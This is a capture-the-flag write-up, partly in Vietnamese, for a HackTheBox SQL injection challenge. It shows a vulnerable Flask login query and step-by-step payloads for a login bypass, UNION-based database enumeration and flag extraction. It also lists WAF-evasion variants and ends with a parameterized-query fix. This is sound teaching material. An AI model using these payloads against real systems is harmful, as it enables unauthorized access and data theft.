---
title: SQL Injection Master - Write-up
date: 2024-10-15
categories:
  - Web Exploitation
tags:
  - SQL Injection
  - Database
  - Bypass
---

# 🎯 SQL Injection Master

!!! info "Challenge Info"
    - **Event**: HackTheBox 2024
    - **Category**: Web Exploitation
    - **Difficulty**: Medium
    - **Points**: 350
    - **Solves**: 87

## 📋 Challenge Description

> Find and exploit the SQL injection vulnerability to retrieve the flag from the database. This challenge requires understanding of SQL injection techniques and filter bypass methods.

**Given files**: `app.py`, `database.sql`

**Target URL**: `http://challenge.htb:1337`

---

## 🔍 Initial Analysis

Khi truy cập trang web, ta thấy một login form đơn giản:

```html
<form action="/login" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
</form>
```

### Source Code Review

Xem qua source code `app.py`:

```python title="app.py" hl_lines="7-9"
from flask import Flask, request, render_template
import sqlite3

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Vulnerable query!
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    result = cursor.execute(query).fetchone()
    
    if result:
        return f"Welcome {result[1]}!"
    return "Invalid credentials"
```

!!! danger "Vulnerability Found!"
    Line 7-9 sử dụng f-string để build SQL query → **SQL Injection vulnerability**

---

## 🛠️ Exploitation Steps

### Step 1: Test Basic SQL Injection

Thử payload đơn giản:

=== "Payload"
    ```sql
    Username: admin' OR '1'='1
    Password: anything
    ```

=== "Resulting Query"
    ```sql
    SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
    ```

=== "Result"
    ✅ Bypass successful! Query always returns True

### Step 2: Enumerate Database Structure

Sử dụng UNION-based SQL injection để xem structure:

```sql title="Payload 1: Count columns"
admin' UNION SELECT 1,2,3,4-- -
```

!!! success "Result"
    Table có **4 columns**

```sql title="Payload 2: Get table names"
admin' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'-- -
```

!!! success "Found Tables"
    - `users`
    - `secrets`
    - `flag` ← 👀 Interesting!

### Step 3: Extract Flag Table Schema

```sql title="Get columns from flag table"
admin' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='flag'-- -
```

**Response:**
```sql
CREATE TABLE flag (
    id INTEGER PRIMARY KEY,
    flag_value TEXT NOT NULL
)
```

### Step 4: Retrieve the Flag

```sql title="Final payload"
admin' UNION SELECT 1,flag_value,3,4 FROM flag-- -
```

!!! success "Flag Retrieved! 🎉"
    ```
    HTB{5ql_1nj3c710n_m4573r_2024}
    ```

---

## 🔐 Bypass WAF (Bonus)

Nếu có WAF filter, thử các techniques sau:

=== "Case Manipulation"
    ```sql
    AdMiN' UnIoN SeLeCt 1,2,3,4-- -
    ```

=== "Comment Injection"
    ```sql
    admin'/**/UNION/**/SELECT/**/1,2,3,4-- -
    ```

=== "Encoding"
    ```sql
    admin' UNION SELECT CHAR(72,84,66),2,3,4-- -
    ```

---

## 🛡️ Mitigation

### ❌ Vulnerable Code
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

### ✅ Secure Code
```python
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
```

!!! tip "Best Practices"
    1. **Always use parameterized queries** (prepared statements)
    2. **Never concatenate user input** into SQL queries
    3. **Use ORM frameworks** (SQLAlchemy, Django ORM)
    4. **Implement input validation** and whitelist approach
    5. **Use least privilege** for database accounts

---

## 🎓 Key Takeaways

- [x] Identified SQL injection via source code review
- [x] Used UNION-based technique to enumerate database
- [x] Extracted flag from custom table
- [x] Learned WAF bypass methods
- [x] Understood proper mitigation techniques

---

## 📚 References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)

---

**Solved by**: Vuong Dat | **Date**: October 15, 2024
